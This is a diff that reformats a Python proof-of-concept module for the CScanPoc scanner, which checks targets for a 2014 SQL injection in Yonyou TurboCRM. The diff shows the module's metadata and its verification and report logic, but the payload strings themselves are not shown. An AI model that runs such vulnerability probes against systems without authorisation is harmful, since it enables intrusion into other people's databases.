@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import time, re
+import time
+import re
+
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0051' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0051'  # 平台漏洞编号，留空
     name = '用友TruboCRM管理系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-18'  # 漏洞公布时间
     desc = '''
         用友TruboCRM管理系统，多出存在SQL注入漏洞：
@@ -28,6 +30,7 @@ class Vuln(ABVuln):
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '07ad5515-0c5d-472a-b7e3-a42f866cf392'
     author = '47bwy'  # POC编写者
@@ -40,9 +43,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2010-083458
-            #resefer     :  http://www.wooyun.org/bugs/wooyun-2010-083452
+
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2010-083458
+            # resefer     :  http://www.wooyun.org/bugs/wooyun-2010-083452
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = [
@@ -69,13 +72,13 @@ class Poc(ABPoc):
                     #security_hole(url + '   sql injection!')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-                           
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
 
+
 if __name__ == '__main__':
     Poc().run()
-
